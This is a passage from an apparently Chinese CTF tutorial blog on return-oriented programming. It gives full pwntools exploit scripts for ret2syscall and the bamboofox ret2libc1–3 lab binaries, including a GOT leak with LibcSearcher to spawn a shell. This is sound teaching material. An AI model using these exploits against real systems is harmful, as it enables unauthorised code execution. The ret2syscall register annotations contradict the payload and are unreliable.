pop edi ; ret</span><br><span class=\"line\">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class=\"line\">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class=\"line\">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class=\"line\">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class=\"line\">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class=\"line\">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class=\"line\">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class=\"line\">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class=\"line\">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class=\"line\">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class=\"line\">0x080481c9 : pop ebx ; ret</span><br><span class=\"line\">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class=\"line\">0x08099c87 : pop ebx ; ret 8</span><br><span class=\"line\">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class=\"line\">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class=\"line\">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class=\"line\">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class=\"line\">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class=\"line\">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>\n\n<p>这里，我选择</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>\n\n<p>这个可以直接控制其它三个寄存器。</p>\n<p>7.此外，我们需要获得/bin/sh字符串对应的地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br><span class=\"line\">Strings information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>\n\n<p>8.可以找到对应的地址，此外，还有int 0x80的地址，如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08049421 : int 0x80</span><br><span class=\"line\">0x080938fe : int 0xbb</span><br><span class=\"line\">0x080869b5 : int 0xf6</span><br><span class=\"line\">0x0807b4d4 : int 0xfc</span><br><span class=\"line\">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>\n\n<p>同时，也找到对应的地址了。</p>\n<p>9.下面就是对应的payload,其中0xb为execve对应的系统调用号。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./rop&#x27;</span>)</span><br><span class=\"line\">pop_eax_ret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">pop_edx_ecx_ebx_ret = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">int_0x80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x80be408</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, pop_eax_ret, <span class=\"number\">0xb</span>, pop_edx_ecx_ebx_ret, <span class=\"number\">0</span>, <span class=\"number\">0</span>, binsh, int_0x80])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>栈布局</strong></p>\n<p>payload栈中部署：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |         int_0x80          | int_0x80指令部署(等待被执行)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |          bin_sh           | execve第一个参数部署(等待pop到edx中)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |            0              | execve第二个参数部署(等待pop到ecx中)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |            0              | execve第三个参数部署(等待pop到ebx中)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |pop_edx_pop_ecx_pop_ebx_ret| 执行pop ebx、ecx、edx ret地址</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |           0xb             | 系统调用号部署（等待pop到eax寄存器中） </span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |       pop_eax_ret         | 执行pop eax ret地址，覆盖原ret返回位置</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |           kdig            | &#x27;hollkdig&#x27;覆盖原saved ebp位置</span><br><span class=\"line\">              ebp---&gt;+---------------------------+</span><br><span class=\"line\">                     |           holl            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           ....            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           kdig            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           holl            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           kdig            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           holl            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">v4终止位置,ebp-0x64--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>执行流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eip ---&gt; pop_eax_ret gadget地址\t\t\t\t   (由于pop_eax_ret覆盖了原ret地址，所以eip指向gadget并执行)</span><br><span class=\"line\">esp ---&gt; 0xb\t\t\t\t\t\t\t\t    (此时esp指向部署到栈中的0xb)</span><br><span class=\"line\">eax = 0xb\t\t\t\t\t\t\t\t\t\t(pop eax后将0xb压入eax寄存器)</span><br><span class=\"line\">eip ---&gt; pop_edx_pop_ecx_pop_ebx_ret gadget地址  </span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t     (由于pop eax结束后进行ret操作，所以eip继续指向第二个gadget并执行)</span><br><span class=\"line\">esp ---&gt; 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)</span><br><span class=\"line\">ebx = 0\t\t\t\t\t\t\t\t\t\t (pop ebx后将0压入ebx寄存器)</span><br><span class=\"line\">esp ---&gt; 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)</span><br><span class=\"line\">ecx = 0\t\t\t\t\t\t\t\t\t\t (pop ecx后将0压入ecx寄存器)</span><br><span class=\"line\">esp ---&gt; bin_sh地址\t\t\t \t\t        (此时esp指向部署到栈中的execve第三个参数bin_sh地址)</span><br><span class=\"line\">edx = bin_sh地址\t\t\t\t\t            (pop edx后将bin_sh地址压入eax寄)</span><br><span class=\"line\">执行int_0x80                                  (由于执行完pop ebx、ecx、edx后进行ret操作，所以eip指向最后的int)</span><br></pre></td></tr></table></figure>\n\n<p><strong>基本ROP</strong>-<strong>ret2libc</strong></p>\n<p>ret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。一般情况下，我们会选择执行system(“/bin/sh”)，故而此时我们需要知道system函数的地址。</p>\n<p><strong>以bamboofox中ret2libc1</strong></p>\n<p>1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2libc1 checksec ret2libc1    </span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      <span class=\"function\">No <span class=\"title\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.此外，利用ropgadget，我们可以查看是否有/bin/sh存在</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2libc1 ROPgadget --binary ret2libc1 --<span class=\"built_in\">string</span> <span class=\"string\">&#x27;/bin/sh&#x27;</span>          </span><br><span class=\"line\">Strings information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\"><span class=\"number\">0x08048720</span> : /bin/sh</span><br></pre></td></tr></table></figure>\n\n<p>确实存在，再次查找一下是否有system函数存在。经在ida中查找，确实也存在。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure>\n\n<p>4.那么，我们直接返回该处，即执行system函数。相应的payload如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc1&#x27;</span>)</span><br><span class=\"line\">binsh_addr = <span class=\"number\">0x8048720</span></span><br><span class=\"line\">system_plt = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">112</span>, system_plt, <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">4</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>这里我们需要注意函数调用栈的结构，如果是正常调用system函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’作为虚假的地址，其后参数对应的参数内容。</p>\n<p>这个例子，相对来说，最为简单，同时提供了system地址与/bin/sh的地址，但是大多数程序并不会有这么好的情况。</p>\n<p><strong>以bamboofox中的ret2libc2为例</strong></p>\n<p>1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2libc1 checksec ret2libc1    </span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n\n<p>2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system(“/bin/sh”)。</p>\n<p>4.首先需要在bss段找一块地址写我们的/bin/sh的字符串，我们可以发现bss段有个buf2的变量，未被使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class=\"line\">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure>\n\n<p>那么构造如下： </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gets(buf2);</span><br><span class=\"line\">system(buf2);</span><br></pre></td></tr></table></figure>\n\n<p>那么先让返回地址为gets函数地址，参数为buf2地址，下一层返回地址需要弹出栈顶的buf2，然后跳到system地址去执行，那么就需要找一个pop|ret的gadget</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x0804872f : pop ebp ; ret</span><br><span class=\"line\">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0804843d : pop ebx ; ret</span><br><span class=\"line\">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x08048426 : ret</span><br><span class=\"line\">0x0804857e : ret 0xeac1</span><br><span class=\"line\">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>\n\n<p>这里我们选择0x0804843d这个地址</p>\n<p>5.利用脚本如下所示：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc2&#x27;</span>)</span><br><span class=\"line\">gets_plt = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">system_plt = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x0804843d</span></span><br><span class=\"line\">buf2 = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class=\"number\">0xdeadbeef</span>, buf2])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，我这里向程序中bss段的buf2处写入/bin/sh字符串，并将其地址作为system的参数传入。这样以便于可以获得shell。</p>\n<p><strong>以bamboofox中的ret2libc3为例</strong></p>\n<p>在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。</p>\n<p>1.首先，查看安全保护。可以看出，源程序仍旧开启了堆栈不可执行保护。</p>\n<p>➜ ret2libc3 checksec ret2libc3<br>   Arch:   i386-32-little<br>   RELRO:  Partial RELRO<br>   Stack:  No canary found<br>   NX:    NX enabled<br>   PIE:   No PIE (0x8048000)</p>\n<p>2.进而查看源码，发现程序的bug仍然是栈溢出。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Can you find it !?&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.那么我们如何得到system函数的地址呢？这里就主要利用了两个知识点</p>\n<ul>\n<li>system函数属于libc，而libc.so文件中的函数之间相对偏移是固定的。</li>\n<li>即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而libc在github上有人进行收集（libc-database），具体细节如下</li>\n</ul>\n<p>所以如果我们知道libc中某个函数的地址，那么我们就可以确定该程序利用的libc。进而我们就可以知道system函数的地址。</p>\n<p>那么如何得到libc中的某个函数的地址呢？我们一般常用的方法是采用got表泄露，即输出某个函数对应的got表项的内容。<strong>当然，由于libc的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露。</strong></p>\n<p>我们自然可以根据上面的步骤先得到libc，之后在程序中查询偏移，然后再次获取system地址，但这样手工操作次数太多，有点麻烦，github上有一个libc的利用工具（LibcSearcher），具体细节请参考readme</p>\n<p>此外，在得到libc之后，其实libc中也是有/bin/sh字符串的，所以我们可以一起获得/bin/sh字符串的地址。</p>\n<p>4.这里我们泄露__libc_start_main的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>\n<ul>\n<li>泄露__libc_start_main地址</li>\n<li>获取libc版本(这里借助的是LibcSearcher)</li>\n<li>获取system地址与/bin/sh的地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行system(‘/bin/sh’)</li>\n</ul>\n<p>exp如下???</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;get the related addr&quot;</span></span><br><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class=\"line\">libcbase = libc_start_main_addr - libc.dump(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;get shell&quot;</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">104</span>, system_addr, <span class=\"number\">0xdeadbeef</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>shell获取小结</strong></p>\n<p>这里总结几种常见的获取shell的方式：</p>\n<ul>\n<li><p>执行shellcode，这一方面也会有不同的情况</p>\n</li>\n<li><ul>\n<li>可以直接返回shell</li>\n<li>可以将shell返回到某一个端口</li>\n<li>shellcode中字符有时候需要满足不同的需求</li>\n<li><strong>注意，我们需要将shellcode写在可以执行的内存区域中。</strong></li>\n</ul>\n</li>\n<li><p>执行     system(“/bin/sh”), system(‘sh’) 等等</p>\n</li>\n<li><ul>\n<li><p>关于 system的地址，参见下面章节的<strong>地址寻找</strong>。</p>\n</li>\n<li><p>关于 “/bin/sh”,“sh”</p>\n</li>\n<li><ul>\n<li>首先寻找 binary 里面有没有对应的字符串，<strong>比如说有 flush 函数，那就一定有 sh 了</strong></li>\n<li>考虑个人读取对应字符串</li>\n<li>libc 中其实是有 /bin/sh 的</li>\n</ul>\n</li>\n<li><p>优点</p>\n</li>\n<li><ul>\n<li>只需要一个参数。</li>\n</ul>\n</li>\n<li><p>缺点</p>\n</li>\n<li><ul>\n<li><strong>有可能因为破坏环境变量而无法执行。</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>执行     execve(“/bin/sh”,NULL,NULL)</p>\n</li>\n<li><ul>\n<li><p>前几条同 system</p>\n</li>\n<li><p>优点</p>\n</li>\n<li><ul>\n<li>几乎不受环境变量的影响。</li>\n</ul>\n</li>\n<li><p>缺点</p>\n</li>\n<li><ul>\n<li><strong>需要 3 个参数。</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>系统调用</p>\n</li>\n<li><ul>\n<li>系统调用号 